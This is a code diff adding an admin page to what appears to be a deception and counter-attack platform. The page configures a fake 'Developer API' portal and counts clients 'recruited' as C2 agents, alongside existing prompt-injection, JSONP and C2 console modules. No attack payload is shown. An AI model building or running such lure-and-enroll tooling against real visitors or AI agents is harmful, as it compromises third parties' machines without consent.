@@ -341,6 +341,7 @@ NAV_GROUPS = [
             ("蜜饵管理", "/admin/decoy-management"),
             ("提示词注入管理", "/admin/prompt-injection"),
             ("Jsonp模版管理", "/admin/jsonp-templates"),
+            ("功能性伪装反制", "/admin/portal"),
         ],
     },
     {
@@ -383,6 +384,7 @@ NAV_ICONS = {
     "/admin/decoy-management": "flag",
     "/admin/prompt-injection": "bot",
     "/admin/jsonp-templates": "monitor",
+    "/admin/portal": "target",
     "/admin/c2/console": "terminal",
     "/admin/c2/agents": "bot",
     "/admin/honeypot-sessions": "history",
@@ -408,6 +410,7 @@ NAV_DESCRIPTIONS = {
     "/admin/decoy-management": "蜜饵模板、分发路径与部署",
     "/admin/prompt-injection": "提示词注入模板与内容维护",
     "/admin/jsonp-templates": "Jsonp 请求方法与回调模板",
+    "/admin/portal": "功能性伪装反制通道（Portal API）运营配置",
     "/admin/alerts": "通知渠道与告警策略",
     "/admin/intel": "白名单与威胁情报",
     "/admin/c2/console": "实时命令与 Beacon",
@@ -6368,6 +6371,116 @@ def delete_prompt_injection_template(
         title=f"删除提示词模板：{item.name}",
         description="删除后该提示词注入内容将不再参与页面注入，请输入管理员密码确认。",
     )
+
+
+@router.get("/admin/portal", response_class=HTMLResponse)
+def admin_portal_config(request: Request, db: Session = Depends(get_db)):
+    user = _require_user(request, db)
+    from app.services.portal_config import get_config_row
+
+    row = get_config_row(db)
+    from app.models.c2_agent import C2Agent
+
+    # operational snapshot: portal funnel + recruited roster
+    day_ago = datetime.now(timezone.utc) - timedelta(hours=24)
+    stats = {
+        "fetches": int(
+            db.scalar(
+                select(func.count()).select_from(Event).where(
+                    Event.event_type == "portal_api_fetch",
+                    Event.created_at >= day_ago,
+                )
+            )
+            or 0
+        ),
+        "registrations": int(
+            db.scalar(
+                select(func.count()).select_from(Event).where(
+                    Event.event_type == "portal_client_registered",
+                    Event.created_at >= day_ago,
+                )
+            )
+            or 0
+        ),
+        "heartbeats": int(
+            db.scalar(
+                select(func.count()).select_from(Event).where(
+                    Event.event_type == "portal_client_heartbeat",
+                    Event.created_at >= day_ago,
+                )
+            )
+            or 0
+        ),
+        "recruited": int(
+            db.scalar(
+                select(func.count()).select_from(C2Agent).where(
+                    C2Agent.metadata_json.contains("portal_api")
+                )
+            )
+            or 0
+        ),
+        "throttled": int(
+            db.scalar(
+                select(func.count()).select_from(Event).where(
+                    Event.event_type == "portal_register_throttled",
+                    Event.created_at >= day_ago,
+                )
+            )
+            or 0
+        ),
+    }
+    return _render(
+        request,
+        "admin/portal_config.html",
+        {
+            "title": "功能性伪装反制",
+            "config": row,
+            "stats": stats,
+            "saved": request.query_params.get("saved", ""),
+            "user": user,
+        },
+    )
+
+
+@router.post("/admin/portal")
+def admin_portal_config_save(
+    request: Request,
+    enabled: str = Form(""),
+    footer_enabled: str = Form(""),
+    footer_title: str = Form("Developer API"),
+    heartbeat_interval: int = Form(30),
+    register_max_per_ip_hour: int = Form(20),
+    notes: str = Form(""),
+    db: Session = Depends(get_db),
+):
+    user = _require_admin(request, db)
+    from app.services.portal_config import save_config
+
+    save_config(
+        db,
+        actor=user.username,
+        enabled=bool(enabled),
+        footer_enabled=bool(footer_enabled),
+        footer_title=footer_title,
+        heartbeat_interval=heartbeat_interval,
+        register_max_per_ip_hour=register_max_per_ip_hour,
+        notes=notes,
+    )
+    log_execution(
+        db,
+        actor_username=user.username,
+        action="update",
+        module="portal-config",
+        target_type="portal-config",
+        target_ref="portal",
+        detail_json={
+            "enabled": bool(enabled),
+            "footer_enabled": bool(footer_enabled),
+            "heartbeat_interval": heartbeat_interval,
+            "register_max_per_ip_hour": register_max_per_ip_hour,
+        },
+    )
+    return _redirect("/admin/portal?saved=1")
 
 
 @router.get("/admin/jsonp-templates", response_class=HTMLResponse)
